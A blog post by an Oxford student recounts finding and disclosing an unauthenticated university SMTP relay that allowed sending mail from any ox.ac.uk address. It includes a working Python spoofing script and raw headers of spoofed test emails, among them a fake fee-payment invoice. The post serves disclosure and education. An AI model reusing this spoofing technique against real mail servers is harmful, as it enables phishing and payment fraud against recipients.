---
layout: post
title: "Vulnerability that allowed anyone to send any email using any ox.ac.uk address"
---

Recently I started doing a masters in maths at Oxford. I was very proud of myself to be able to get a place at the best university in the world. As a nice perk, I got an email address deyao.chen@maths.ox.ac.uk. Very cool. But it required some special configuration using SMTP, because by default, the sender’s address is deyao.chen@reuben.ox.ac.uk. I love Reuben College, but I think I love maths a bit more (sorry!). To be utter surprise, not only could I send from my @maths email, anyone can send from any email ending ox.ac.uk (like finance@ox.ac.uk). This sounds too good to be true but it actually was.

In what way was it misconfigured? You’ll be surprised. You could use it without any authentication — no username no password. What is the capability? You could put anything in the sender and receiver field and the server will relay it without question. See the short python script below

```python
import smtplib
from email.message import EmailMessage

msg = EmailMessage()
msg['Subject'] = "Test 6"
msg['From'] = "Oxford Admin <admin@ox.ac.uk>"
msg['To'] = "chendeyao000@gmail.com"
msg.set_content("Hello.")

with smtplib.SMTP("smtp.ox.ac.uk", 587) as server:
    server.starttls()
    server.send_message(msg)
```

That’s it. 

Luckily, they have firewall so that the server is not accessible from the internet so it was probably not immediately catastrophic. But anyone connected to the eduroam wifi, including those from other institutions can use the server. It gets worse. As you will see soon, this can include random Joe.

Interestingly, if I enter a wrong password, it will reject the email. So it seemed to be a classic mistake where an empty field triggers something completely unexpected. 

Since it’s already fixed, I can finally write this blog post telling you about it and also document the discovery and reporting process. Hang tight, because it was just as bizarre — if not more so — than the vulnerability. 

## The bizarre journey of getting it fixed

### Initial discovery

On the evening of 11th October, I followed the [guide from the maths department](https://www.maths.ox.ac.uk/members/it/faqs/communication/zimbra-nexus-migration#sending-from-alternative) to configure my email client to send from deyao.chen@maths.ox.ac.uk, using the university’s SMTP server. I also thought it was a good idea to finally try to use Thunderbird. I’ve never used it because it didn’t support OAuth, which was required for my previous university — University of St Andrews. But this finally seemed like the time to try it. 

As expected, it was kind of convoluted to get to the configuration flow for SMTP, probably because they wanted to direct people away from this rarely used and confusing (to normies) option. I don’t remember the exact details but I remember having to leave a few entires blank in the set up box so I can go to settings and choose the correct option. For some reason, I decided it was a good idea to try to send something to my gmail before everything was configured. To my surprise, the email actually arrived. I was a bit confused because I didn’t remember that I entered my password. I thought maybe I remembered it wrong, or maybe it grabbed my password from somewhere else with some magic. Or perhaps, more impossibly, the smtp server did not check for the authentication. I tried to reproduce it, but I could not do it in Thunderbird. 

So I bought out the big gun: asking ChatGPT for a command line tool. I like command line tools because everything in explicit: they only use variables that you pass in as arguments, and there is no magic like grabbing a password from the keychain, or a getting session token in some shared storage.

### First report getting ignored

I realized this was huge. The emails came from the actual Oxford server so everything like DMARC, SPF, and DKIM passes. So it would appear 100% legit. For example, anyone can use feepayments@reuben.ox.ac.uk to ask for money to be paid to their account. You can probably imagine many other nefarious ways to take advantage of it.

I searched online for ways to report vulnerability and found oxcert@infosec.ox.ac.uk. Unfortunately there was no bug bounty program. Even so, I thought I had a responsibility to report it before it falls into the wrong hand. Also it’d be cool to discovery my first vulnerability. So in the earlier morning of the 12th I sent them an report.

I was quite cagy with my initial report. I only mentioned that emails could be spoofed and asked for an in person meeting. I didn’t specify that I connected to eduroam, because I worried that by giving more qualifiers it could lead to someone rediscovering the venerability. 

### Second report getting threatened with disciplinary action

To my utter surprise, on the 13th, I got a response from OxCert saying it was “expected design” and that the SMTP server could not be access from the internet. I replied I was pretty sure it was not by design and also gave them a 90-day countdown to public disclosure. It was fun cosplaying some whitehat :D. Then I found that John Ireland, the Director of Software Solutions, put my ticket as resolved and “no action requested”. I thought maybe they thought I was bluffing or misunderstood what I was trying to say. After all, I would have a hard time believing them if someone just told me they could spoof any email address — it is a indeed a solved problem in cybersecurity. I wish I could tell him “there is not ANY fucking authentication AT ALL”. But again, I was worried the exploit would fall into the wrong hand. So I thought I could get his attention by sending him an email using admin@ox.ac.uk as a demo.

I got a reply soon. He reasserted that it was indeed by design. He explained to me the existence of SPF, DKIM, and DMARC. He said that to use that service I had to authenticate myself before I could access the network. He then quoted the university policy forbidding this. I was pretty sure that’s not how it works. You can’t just tell criminals to just follow the law! 

Worst of all, he warned me to not send any further demo emails “as it may result in disciplinary action”. I had no word.

Later that day, someone emailed me on the same ticket, asking me to discuss the finding over email, asserting to me it was secure, so I sent the python code over. I finally got a positive reply that it was a valid issue and they were investigating on the 15th. 

Back to the 13th. After the exchange, I was particularly curious about the network part. I was connected to eduroam. Eduroam is a wifi service that academic institutions from around the world use. It basically allows anyone with an account to connect seamlessly to any eduroam wifi around the world. It was not some Oxford only network. So naturally I wondered if people not from Oxford could use the SMTP server. I suspected so because I didn’t think anyone would design eduroam to assign people from different institutions to different ip blocks and configure the firewall accordingly. To test it, I thought to try with a different account. Unfortunately, my old eduroam from St Andrews no longer worked.

Then I suddenly remembered that I should try Taobao — a Chinese e-commerce platform where everything is for sale. There is a saying in China that if it doesn’t exist on Taobao then it probably doesn’t exist at all. You might know its western counterpart made by the same parent company: AliExpress. As expected, I could buy an account for ¥15 (~$2USD) for a duration of a month. The seller just asked for a phone number, which they did not even verify, to serve as the account number. 

Because of time zone difference, I got my eduroam account at around midnight. Even though I was going to sleep, I couldn’t because I was so eager to find out if it worked, and I was worried the vulnerability could be fixed at any time. So after finding no sleep, I decided to get up and try it. I logged in with the new account, spoofed my wifi mac address just in case and guess what. It still worked.

It was 5 am in the morning on 14th. I thought I had to reply to explain it to John again. I also thought this was such a basic thing that it would sooner or later be discovered by someone else. I thought it was the responsible thing to disclose it publicly in 90 days. So reemphasized it in the email. Little did I know, this was a bad idea. It would come to bite me later.

Then on the 16th, out of nowhere, I received an email from Professor Kostas Margellos, the Dean of Reuben College. He reminded me that I needed to respect the associated policies and avoid posing deadlines. Thankfully, he also said that it does not bear “any disciplinary tone, and clear no consequences”. At this point, I was quite overwhelmed so I didn’t do anything about it for more than a week.

For so many times, I wanted to tell someone, especially when my friends were talking about configuring their emails to send from @maths. But I held back on every opportunity.

Then on 24th October, I was feeling a lot better. I thought I needed to try again. I discovered that it was still not fixed and replied to his email and explained the situation. I got an reply on 4th November basically reiterating the same points.

### Third report finally worked

Then on the evening of 3th November. I just had my dinner in college and was on my way back to the library for some more work. I saw the Vice-Chancellor Professor Irene Tracey at Reuben College. From what I glimpsed from a poster, it was an event with for council something. I could see that many important people were there. I thought to just tell her but I didn’t know if it would be appropriate or if she would even care. But I thought it was worth a shot. Very very luckily everyone was so nice. Someone spotted that I was standing there and asked me what I needed. I told her that I just wanted to say hi to Professor Tracey. She immediately went on to get Irene for me (instead of just dismissing me). That was a pleasant surprise. Irene was actually very very nice and listened attentively. I told her the issue and she went on to find Professor Anne Trefethen, and David White. Luckily again, Anne was also very nice. She told me to email her the details and she would take a look at it just later that night. I sent her an email with more details as well as the python code snippet, she replied the same evening. It was so fast.

Three days later on the 6th, I received an email from Anne saying it was fixed. She said sorry for the response from some colleges, cc’ed Reuben’s president so that he’s aware of my good works, and relayed thanks from Irene. I was so glad. 

Lastly, and most importantly, test your app with empty strings and undefined variables!

## Appendix

I put here several emails I sent to myself from various ox.ac.uk email address so you can check the DKIM value for yourself. 

```
Delivered-To: chendeyao000@gmail.com
Received: by 2002:a17:907:a646:b0:b3f:8191:382 with SMTP id vu6csp2430746ejc;
        Sat, 11 Oct 2025 18:08:34 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IHCotRl/nPkM0IdU97qsp9tb40GoWYg9Hl94FUnWH060Cp3ZQsD6Uidwwe+LWQnrFWXyYa5
X-Received: by 2002:a5d:5d03:0:b0:3d1:6d7a:ab24 with SMTP id ffacd0b85a97d-42667177c28mr10937527f8f.17.1760231314332;
        Sat, 11 Oct 2025 18:08:34 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1760231314; cv=none;
        d=google.com; s=arc-20240605;
        b=MD/Dvouje3dmQd7QysO1WOsbrciuegyicqANLfdFgG/tihoeJnNRi+Zc8Gl/XH/r4q
         qMn+5RQtRpG/kNw9KRYT8htOnhTlnOYi+yP38MTF0aX/3e5j7zoE9ALMwSqBTtnc5K7H
         Fg6EVR/RZWi3fLwlO1owG5hjmJC8cmX4oRIDp1BY3TS1HGC+65xSuzZZTgHsM0jWFiU1
         TiHhlFPjTO1ELVm+Dj7pIU3abeVILLEYdikugtUm9nJonGQULXU8FYceePbySpX57olZ
         K9ircjFupuJoeGRkChluP2MbgUILDafuwnNmSS69aWeRZckmC9/XWBtMO14ObFRR4VOj
         m/dA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=date:message-id:mime-version:content-transfer-encoding:to:from
         :subject:dkim-signature;
        bh=Ba3gj8+xBPQLJTahTfzW6RbWQ/XPgESxkCi2B66PSQg=;
        fh=e74W4SjK/DwiGJsc2adt3k3HYnQQ33qmWFCPn8qmRmE=;
        b=lQJGVti14KXGi4b4DNSFXGefSo5zBXp2XeoKcZzmGdvhk78Vc1oR/BG06PVueWVvzc
         0onYeX81wbtgW4cCPzx2G/vRC7KzxuhphXkPTBHtYbtNH2Z6sCVLs2bRgBF4vM/zjaUC
         ndfLBOrcVcOR6otrpd4Mk3zH9SM1rsh0usAI83fBcXXjqlmUTFQ+xxRqt5p5XstP+T9W
         hJKirPwmkpxh1UdeqW8P/WtUz35w7WyYAkWPAtu3Tsmm5tfmP+0pMjXSqRTmrxKt4/08
         BMNGE4KjCNblt6X9QjZoIEURqzsbwoGBH0JP5HbxZas1IaRCF7Y6LcRVXeKdS9CvZB/3
         TTzg==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=Zn69SIfA;
       spf=none (google.com: anyone@does-not-exist.ox.ac.uk does not designate permitted sender hosts) smtp.mailfrom=anyone@does-not-exist.ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
Return-Path: <anyone@does-not-exist.ox.ac.uk>
Received: from relay20.mail.ox.ac.uk (relay20.mail.ox.ac.uk. [163.1.2.170])
        by mx.google.com with ESMTPS id ffacd0b85a97d-426ce5cd101si3251659f8f.302.2025.10.11.18.08.34
        for <chendeyao000@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 11 Oct 2025 18:08:34 -0700 (PDT)
Received-SPF: none (google.com: anyone@does-not-exist.ox.ac.uk does not designate permitted sender hosts) client-ip=163.1.2.170;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=Zn69SIfA;
       spf=none (google.com: anyone@does-not-exist.ox.ac.uk does not designate permitted sender hosts) smtp.mailfrom=anyone@does-not-exist.ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=ox.ac.uk;
	 s=flood; h=Date:Message-Id:MIME-Version:Content-Type:To:From:Subject: reply-to:cc; bh=Ba3gj8+xBPQLJTahTfzW6RbWQ/XPgESxkCi2B66PSQg=; t=1760231314;
	 x=1761095314; b=Zn69SIfAHSfj0IcArai8Y9UAuUHDJ/e0ZqMhnfq27n4PLyhTOr4VQIr5/YAC N6XRx3A11TD/R6j8rbEX7IQOQBkHkwIzpbhWyyLMRQ9qDq8JZ1KDXJO1l20ea+i+f1jzaTyC6XjJr SZ0ler7VftE9cLUXijDOFvdp15iT49Zz/ZsMIqjfURvjpTWdC33c1WFv0UfhVrjTYy9aOuhVMjEAb Ddz8N4Ijnnk/bD/jfRg8N0HuecF+BLOibIbCaUj+BK6+ma0U/CZPbX8Jq2vpYh70f30WO5MpT8Qqk 3KARh4qnKo98Nfx2VlcB6KN4MSfkdlue3WXoCHHkJqstmx7zcrA==;
Received: from smtp9.mail.ox.ac.uk ([129.67.1.206]) by relay20.mail.ox.ac.uk with esmtps (TLS1.3:ECDHE_RSA_AES_256_GCM_SHA384:256) (Exim 4.92) (envelope-from <anyone@does-not-exist.ox.ac.uk>) id 1v7kZd-0000jr-G2 for chendeyao000@gmail.com; Sun, 12 Oct 2025 02:08:33 +0100
Received: from client-8-217.eduroam.oxuni.org.uk ([192.76.8.217]:53696 helo=1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa) by smtp9.mail.ox.ac.uk with esmtps
  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2) (envelope-from <anyone@does-not-exist.ox.ac.uk>) id 1v7kZd-0006gs-VF for chendeyao000@gmail.com; Sun, 12 Oct 2025 02:08:33 +0100
Subject: Test 8
From: anyone@does-not-exist.ox.ac.uk
To: chendeyao000@gmail.com
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
MIME-Version: 1.0
Message-Id: <E1v7kZd-0006gs-VF@smtp9.mail.ox.ac.uk>
Date: Sun, 12 Oct 2025 02:08:33 +0100

Hello
```

```
Delivered-To: chendeyao000@gmail.com
Received: by 2002:a17:907:a646:b0:b3f:8191:382 with SMTP id vu6csp2757911ejc;
        Sun, 12 Oct 2025 15:22:32 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IFzKb3AUQJvpyiBE9tM+CXw7UMkhMHwZ0huXpvPTIW9WTcPsW6ujQmCx7Z25vy/1EvzMXvq
X-Received: by 2002:a05:6000:438a:b0:424:2275:63c7 with SMTP id ffacd0b85a97d-4266e8e64famr11192958f8f.56.1760307752212;
        Sun, 12 Oct 2025 15:22:32 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1760307752; cv=none;
        d=google.com; s=arc-20240605;
        b=YKwlGdGMd2fuOb2SHaeNGQIH8s2vWtZgMoWPAAgzsgcDNfWZGQFSsnls8nypXYKKw8
         VPw8mnFrIoVQHGHlWoULCdvjtEz1UR3fFJPgADAg3Ohnhd9zWjdFOnfw1nOSbNlrr+68
         acGH/VJKFGLPL8m34hyXq4lSG9KGB1NsiKMzzApAZvVRZGe50L0WsMQgZxNKFsufNbFk
         oKWXsnZBbVg7BuGD5/+IBXx5xSSAWuttTn9O+PZrAG6n9n5bACdDrv2D7T9HkzdH5zMA
         g/3rZURNl2e7HUvOv+4edAbEyzQ68qiahZGlgof6aH8XLbKol4zAjPvc1mZSCvAYxgKE
         C00Q==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=date:message-id:mime-version:content-transfer-encoding:to:from
         :subject:dkim-signature;
        bh=qqFw2xOxeThwz4JegbmFCSZ+scZibjCWbvDcPNaYKB0=;
        fh=e74W4SjK/DwiGJsc2adt3k3HYnQQ33qmWFCPn8qmRmE=;
        b=hD/B4TFBOYhdzFpGaqrHGpnIveaaP88otigsvRYiPieC19QwfZX866LmFLWBaIUh1x
         Qu5/WjRhQT4/3yEPk7BWIsLLv9TCQeyFCANywu4Wtj2DB+PpRop1DH8BwOArstFuWUkd
         spqTgvkXJoONtOVXDLn7mDxjXoXliy4sdqSzghibnu0oZKx4UHRYRLQHdivlkvTDhWNn
         InxEwPW9ewJ0QmLjU930rh56Cbc4I/kU/Kqfn8iAymyQfDix6PeGNPb/KzjDgmxulZR5
         wCAwOP9Zp0lfRCpxav4GbThNrYjzxVAa5jgFRbYk/vQVgB9vZVAGrbhNNq1Rmf8hCbDD
         Xrrw==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=ahjXlbXK;
       spf=pass (google.com: domain of feepayments@reuben.ox.ac.uk designates 129.67.1.170 as permitted sender) smtp.mailfrom=feepayments@reuben.ox.ac.uk;
       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=reuben.ox.ac.uk
Return-Path: <feepayments@reuben.ox.ac.uk>
Received: from relay19.mail.ox.ac.uk (relay19.mail.ox.ac.uk. [129.67.1.170])
        by mx.google.com with ESMTPS id ffacd0b85a97d-426ce5deebcsi4104421f8f.561.2025.10.12.15.22.32
        for <chendeyao000@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sun, 12 Oct 2025 15:22:32 -0700 (PDT)
Received-SPF: pass (google.com: domain of feepayments@reuben.ox.ac.uk designates 129.67.1.170 as permitted sender) client-ip=129.67.1.170;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=ahjXlbXK;
       spf=pass (google.com: domain of feepayments@reuben.ox.ac.uk designates 129.67.1.170 as permitted sender) smtp.mailfrom=feepayments@reuben.ox.ac.uk;
       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=reuben.ox.ac.uk
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=ox.ac.uk;
	 s=flood; h=Date:Message-Id:MIME-Version:Content-Type:To:From:Subject: reply-to:cc; bh=qqFw2xOxeThwz4JegbmFCSZ+scZibjCWbvDcPNaYKB0=; t=1760307752;
	 x=1761171752; b=ahjXlbXKh32qMYGRwzC5FTQUCT0XaLZTGkFZkm/34uo6w3zje1l0umpDt0sH rPY9Cjp/eKkJDdEzaO0SN6gszxPJV9We7FTPjwh3LnOEhkVX/EC1PxhTld+OUqyuAeIukpQ2qjiQO DL4M+Arfz6wibB4rlcmiZuQucqCz9IehhiZIw7WF/GGA6uO+gEn21pQ6k/JdhxZqYA4LSlQo80/Pt iXQfuxlV4NSxkES5w9UR6zoXpWQuX0rRi7sydbT6+fIW0IDGO6uQARKDjUUf2V5DGP9CypYfbDYun uos5ds7xBs/7HhrVyPT6eMURfXg5tzUOTgcwZu6i9ycMxI2lslA==;
Received: from smtp9.mail.ox.ac.uk ([129.67.1.206]) by relay19.mail.ox.ac.uk with esmtps (TLS1.3:ECDHE_RSA_AES_256_GCM_SHA384:256) (Exim 4.92) (envelope-from <feepayments@reuben.ox.ac.uk>) id 1v84SV-0007gI-Cl for chendeyao000@gmail.com; Sun, 12 Oct 2025 23:22:31 +0100
Received: from farn-4.gradacc.ox.ac.uk ([192.76.28.244]:56983 helo=1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa) by smtp9.mail.ox.ac.uk with esmtps
  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2) (envelope-from <feepayments@reuben.ox.ac.uk>) id 1v84SV-00033S-V9 for chendeyao000@gmail.com; Sun, 12 Oct 2025 23:22:31 +0100
Subject: Invoice for Tuition Fees 2025-26 - Reuben College, University of Oxford 5
From: Reuben College Fee Payments <feepayments@reuben.ox.ac.uk>
To: chendeyao000@gmail.com
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: quoted-printable
MIME-Version: 1.0
Message-Id: <E1v84SV-00033S-V9@smtp9.mail.ox.ac.uk>
Date: Sun, 12 Oct 2025 23:22:31 +0100

A total amount of =C2=A340,000 is due. Please wire transfer to the followin=
g account: 12345678.

```

```
Delivered-To: chendeyao000@gmail.com
Received: by 2002:a17:907:7f0c:b0:b66:130d:b45e with SMTP id qf12csp189862ejc;
        Wed, 29 Oct 2025 07:30:52 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IEig0tFh6ZG1aEAdaklnQY6Mq8MRZDYkoWrWu4kY4C7FCRTpMlpZdYpTX1q1LLX/zFt0GBy
X-Received: by 2002:a05:600c:46c4:b0:46d:996b:828c with SMTP id 5b1f17b1804b1-4771e18432emr27048295e9.10.1761748252026;
        Wed, 29 Oct 2025 07:30:52 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1761748252; cv=none;
        d=google.com; s=arc-20240605;
        b=cAHjQYn4xpbYEgnVU7QPNoQmn1niviUCrDcU6i+l+0ZBWdlZb3iH6o4nFZmYBn6UZa
         +5++FKcGWzixisT0eYGLNrukLGIsXXzw/nvk1J3k3/QDd2Y13zA8aUBbR6Y6znTEKASi
         N456+jdDE04+DK8N6RvCneufXoTf3GgVPp6HC3Bh51ws0BQz6erp+16u/DyXNUxsplZK
         2bCOXkkQduyB+2cBstXLBL2vXU9QMuq/iTOJELEEzjczjfruBB8d6gjOSG3q7X5H0cun
         NFj1YzmKNHRrmGJpOSV+FmeGBlvF7bAt02Cw+b5wAb2/jmcNXOfJ30O21CZvylNJHGEu
         5bkQ==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=date:message-id:mime-version:content-transfer-encoding:to:from
         :subject;
        bh=yZQq1c8wjBl0fZ4Wc/oraMCAG1mZJv5v/hlvyFy+t6A=;
        fh=e74W4SjK/DwiGJsc2adt3k3HYnQQ33qmWFCPn8qmRmE=;
        b=H2gWT5AVFJpwIF3nr3z3p46+69ARa9412xfiJR9FvQh5+mEufP/R1XyH879qZYeNck
         rEJnQbWQ8OTUKWq/3oqAPdBsh2xVRro0p/Vf6zfPIX1bFDGwBDlKOIBZWTIf7HEFXyfD
         hJLELKMPVk4OtMgJHJ8/G4mLZU5qrNt+QmTO6vfiLoj2X8smHnD8BAwc9E8/vzfQ+8X7
         Xh8xJSVAJO1Yex+SXqz9bxcuFKpKa0Gg7Ccq16zlehncIgiO/G9nUTXuWTqnmTYgNU5V
         VdvApxtG3IkQBfHL9XVak17YalgkceFok2535G3Ay1TZvK6qL6/Rb+swpTCmbd12HEFA
         m9tw==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       spf=pass (google.com: domain of admin@ox.ac.uk designates 163.1.2.170 as permitted sender) smtp.mailfrom=admin@ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
Return-Path: <admin@ox.ac.uk>
Received: from relay20.mail.ox.ac.uk (relay20.mail.ox.ac.uk. [163.1.2.170])
        by mx.google.com with ESMTPS id ffacd0b85a97d-4299610d613si7789624f8f.832.2025.10.29.07.30.51
        for <chendeyao000@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 29 Oct 2025 07:30:51 -0700 (PDT)
Received-SPF: pass (google.com: domain of admin@ox.ac.uk designates 163.1.2.170 as permitted sender) client-ip=163.1.2.170;
Authentication-Results: mx.google.com;
       spf=pass (google.com: domain of admin@ox.ac.uk designates 163.1.2.170 as permitted sender) smtp.mailfrom=admin@ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
Received: from smtp8.mail.ox.ac.uk ([163.1.2.204]) by relay20.mail.ox.ac.uk with esmtps (TLS1.3:ECDHE_RSA_AES_256_GCM_SHA384:256) (Exim 4.92) (envelope-from <admin@ox.ac.uk>) id 1vE7CN-00053v-FD for chendeyao000@gmail.com; Wed, 29 Oct 2025 14:30:51 +0000
Received: from client-8-192.eduroam.oxuni.org.uk ([192.76.8.192]:56279 helo=1.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.ip6.arpa) by smtp8.mail.ox.ac.uk with esmtps
  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2) (envelope-from <admin@ox.ac.uk>) id 1vE7CN-0005of-RD for chendeyao000@gmail.com; Wed, 29 Oct 2025 14:30:51 +0000
Subject: Test 6
From: Oxford Admin <admin@ox.ac.uk>
To: chendeyao000@gmail.com
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit
MIME-Version: 1.0
Message-Id: <E1vE7CN-0005of-RD@smtp8.mail.ox.ac.uk>
Date: Wed, 29 Oct 2025 14:30:51 +0000

Hello.
```

```
Delivered-To: chendeyao000@gmail.com
Received: by 2002:a17:907:a646:b0:b3f:8191:382 with SMTP id vu6csp2420741ejc;
        Sat, 11 Oct 2025 17:19:14 -0700 (PDT)
X-Google-Smtp-Source: AGHT+IEo0qpI0PgZ8wKO9VLULKH/DzLrQBXR96crB0Ao4od7kJDu2qr5wUHdtf9Bw2reRS5HoxUv
X-Received: by 2002:a05:6000:2681:b0:3e8:68:3a91 with SMTP id ffacd0b85a97d-4266e8db27cmr10314507f8f.60.1760228354339;
        Sat, 11 Oct 2025 17:19:14 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1760228354; cv=none;
        d=google.com; s=arc-20240605;
        b=JmOgaI/w3jqkxHJvPIK4tUMCkVMdCE0cxBbJzd1vL1fxKtbGZqPMKuWMA3qkAjI/3b
         sae5ctYf6AFhgdsdfQhD5YYQE2x+eiZJEagPfA82UpjFMMtKSuw2t+bAlAVDLkUyM1pK
         c887GNQ65BPk0hWmXkVgGJm3UVgHCPTnwIQybcx4Ez7p9enCwm/EC1+4Xi+SBtNqkGKF
         AXkaAySbv6m5vf2DwzeifFYJBBJGoVPyLDYcUYcof7kwVOZWvAR71iCa7r6EoEYphqrX
         kdYWYhOYIlyhq1jwAtjvEnfbETQq0cWKrrlkhDkbqvITV+4nIfRhh2cDwzLAJxyM6INX
         Rosw==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=message-id:subject:from:to:date:dkim-signature;
        bh=yPch21UgTdjeeSDrwn2r6pOP600pPaAOXQ8OWSNAFrk=;
        fh=e74W4SjK/DwiGJsc2adt3k3HYnQQ33qmWFCPn8qmRmE=;
        b=NfvXJZl0LcqLUWsmJ6sORlWvnirT2gscO7zNZnh9MoOLAVKQl7TC18zpzM61FMhDxG
         hUILnF789Z93Eb/x+2OgwijrUaBW9eYST1XmNdPzqq+HZ1CpbXtTFXH2j51gx9nqT2PU
         6j3HiLAp1R8fuCuC9/rtisE248ZpgmknMZEKEOO8N+NL3G92Rcqh/7wolgXitzvRqrbn
         odvjABVNxhtsvPWwUe+vgJBQYfCZ5/bLQ6BUsss+OFD4M9Z+nzaOUrJ3Ot+P7alEoX+8
         En7oiuhPj1Zz5T0tQnXZTcUwzTZpDj0m7V7MW/zfvKsRm8FwsRyAnzaDV27H3exP27G6
         f95A==;
        dara=google.com
ARC-Authentication-Results: i=1; mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=MhXbQfex;
       spf=pass (google.com: domain of moid.saber@maths.ox.ac.uk designates 163.1.2.170 as permitted sender) smtp.mailfrom=moid.saber@maths.ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
Return-Path: <moid.saber@maths.ox.ac.uk>
Received: from relay20.mail.ox.ac.uk (relay20.mail.ox.ac.uk. [163.1.2.170])
        by mx.google.com with ESMTPS id ffacd0b85a97d-426ce573128si3059445f8f.151.2025.10.11.17.19.14
        for <chendeyao000@gmail.com>
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 11 Oct 2025 17:19:14 -0700 (PDT)
Received-SPF: pass (google.com: domain of moid.saber@maths.ox.ac.uk designates 163.1.2.170 as permitted sender) client-ip=163.1.2.170;
Authentication-Results: mx.google.com;
       dkim=pass header.i=@ox.ac.uk header.s=flood header.b=MhXbQfex;
       spf=pass (google.com: domain of moid.saber@maths.ox.ac.uk designates 163.1.2.170 as permitted sender) smtp.mailfrom=moid.saber@maths.ox.ac.uk;
       dmarc=pass (p=QUARANTINE sp=QUARANTINE dis=NONE) header.from=ox.ac.uk
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=ox.ac.uk;
	 s=flood; h=Message-Id:Subject:From:To:Date:reply-to:cc:mime-version: content-type; bh=yPch21UgTdjeeSDrwn2r6pOP600pPaAOXQ8OWSNAFrk=; t=1760228354;
	 x=1761092354; b=MhXbQfexId5AlfJalJV2BVYpBebV6yBD5yFwqujdyLfwncaWzArTrhER7u9p RBwkC5s2SO7+OmE89HsHX6uv7qgZr0Gsmw6pJmr8ZccDeyICzDEs8ofj174YtGq0U5ZSu/19Y/p2y PLnUQP34gfG74n4rO7h9shHZBO+RZceSD3ZPxfy1KfhSnHVodbxZYgF9v7yzY5mfRHhNiTZ1LvMc1 fHRBuGxUZX3veGCdUvC6qHcXCgj7bWLjN2GsYbFyvOqlHPByzhdSz/gTdb8shAA6GMWX64yQcb5J9 A423KuFk7/spt7brddpG4ibkbZAenIRpvW2LDhhiXFHEsoi7UOw==;
Received: from smtp9.mail.ox.ac.uk ([129.67.1.206]) by relay20.mail.ox.ac.uk with esmtps (TLS1.3:ECDHE_RSA_AES_256_GCM_SHA384:256) (Exim 4.92) (envelope-from <moid.saber@maths.ox.ac.uk>) id 1v7jnu-0002r0-DT for chendeyao000@gmail.com; Sun, 12 Oct 2025 01:19:14 +0100
Received: from farn-4.gradacc.ox.ac.uk ([192.76.28.244]:51626 helo=deyaos-macbook-air-2.local) by smtp9.mail.ox.ac.uk with esmtps
  (TLS1.3) tls TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.94.2) (envelope-from <moid.saber@maths.ox.ac.uk>) id 1v7jnt-0000ii-Vt for chendeyao000@gmail.com; Sun, 12 Oct 2025 01:19:13 +0100
Date: Sun, 12 Oct 2025 01:19:13 +0100
To: chendeyao000@gmail.com
From: moid.saber@maths.ox.ac.uk
Subject: Test Email
Message-Id: <20251012011913.014792@deyaos-macbook-air-2.local>
X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/

This is a test email sent via Oxford SMTP.
```